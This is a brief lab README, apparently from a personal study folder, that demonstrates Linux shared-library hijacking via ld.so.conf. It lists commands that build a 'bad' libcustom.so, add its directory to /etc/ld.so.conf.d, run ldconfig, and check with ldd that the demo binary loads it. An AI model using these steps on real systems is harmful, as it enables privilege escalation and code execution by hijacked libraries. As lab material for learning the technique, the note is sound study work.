# Reference
- https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example

# Steps 
1. `gcc -shared -o libcustom.so -fPIC libcustom.c`
2. `sudo cp libcustom.so /usr/lib`
3. `gcc demo.c -o demo -lcustom`

# Before Exploit
- `ldd demo`
- which should output `libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)`

# Make bad lib
- `mkdir badlib` 
- `gcc -shared -o badlib/libcustom.so -fPIC libbad.c` 

# Exploit
- `sudo echo $(pwd)/badlib > /etc/ld.so.conf.d/bad.conf`
- `sudo ldconfig`

# Check explot
- `ldd demo`
- which outputs `libcustom.so => /home/alfred/mystudy/ldconfig-exploit-demo/badlib/libcustom.so (0x00007f99c8658000)` 
